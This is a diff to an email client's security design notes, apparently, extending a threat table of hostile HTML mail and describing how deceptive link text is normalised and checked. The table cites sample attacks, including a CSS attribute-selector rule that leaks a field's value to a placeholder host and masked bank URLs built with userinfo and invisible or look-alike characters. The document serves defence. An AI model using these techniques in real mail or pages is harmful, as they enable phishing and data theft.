@@ -49,7 +49,7 @@ does about the local attackers:
 | Tracking pixels | remote `<img>`, CSS `url()`, `@import`, `@font-face`, `<link>`, `srcset`, `<video poster>` | confirms address is live, leaks IP, time, client, sometimes read-receipts of forwarded mail |
 | CSS exfiltration | attribute selectors + `url()` (`input[value^="a"] { background: url(https://x/a) }`), `@font-face` unicode-range | leak of page content character by character |
 | Content spoofing / overlay | `position: fixed/absolute` overlays, z-index tricks, hidden text, `<form>` with our styling | phishing that looks like client UI |
-| Masked links | link text ≠ href, IDN homographs, a bank's name in the userinfo (`https://bank.example@evil.example/`, and with a character one URL parser refuses there while the browser does not: `https:// bank.example@evil.example/`), `data:` and `blob:` URLs | phishing |
+| Masked links | link text ≠ href, IDN homographs, a bank's name in the userinfo (`https://bank.example@evil.example/`, and with a character one URL parser refuses there while the browser does not: `https:// bank.example@evil.example/`), a text that reads as the bank's address to a person but not to a parser (a soft hyphen, zero-width or bidi character in its host, a space around an inline element, a trailing dot, a homoglyph, a backslash or fullwidth slash before the path, userinfo in the text), one href listed under two texts (an empty anchor, then the bank's), `data:` and `blob:` URLs | phishing |
 | Frame / navigation | `<iframe>`, `<meta http-equiv=refresh>`, `<base href>` | loading arbitrary origins, rewriting relative links |
 | Resource exhaustion | deeply nested tags, huge documents, billion-laughs-style entity tricks, giant images | UI hang, memory exhaustion |
 | Mixed-content reference | `cid:` pointing to non-existent or foreign parts | confusion, occasional parser bugs |
@@ -219,7 +219,20 @@ fetch a page, both unseen by the filter:
   userinfo, and a listed link opens without the question only when the
   address the browser will get has its host on the text's site; that
   address never carries userinfo, so the question names the real host
-  first ([windows-port.md §6.4](windows-port.md#64-links)).
+  first. Every listed link with the clicked href is judged, not the
+  first, since a click cannot tell two anchors with one href apart. The
+  text is read as a person sees it: format and other default-ignorable
+  characters go first, it is read in NFKC with the ideographic full stop
+  as a dot, hosts are compared in punycode without a trailing dot, every
+  address in the text counts, and one that reads as an address but whose
+  host cannot be read (a space inside it, userinfo, an escape) names a
+  host no link leads to, so it is asked about. A single-label host (a
+  top-level domain, an intranet name) is no site of the hosts under it;
+  multi-label public suffixes such as `co.uk` are not known without a
+  public-suffix list, so `https://co.uk/` still counts as the site of a
+  text that names `bank.co.uk`. A link the launcher refuses is never
+  offered and says so in a toast
+  ([windows-port.md §6.4](windows-port.md#64-links)).
   New windows, downloads, external schemes, frames, permissions,
   authentication, client certificates, certificate errors, screen capture
   and Save As are refused; the context menu keeps Copy and Copy Link;
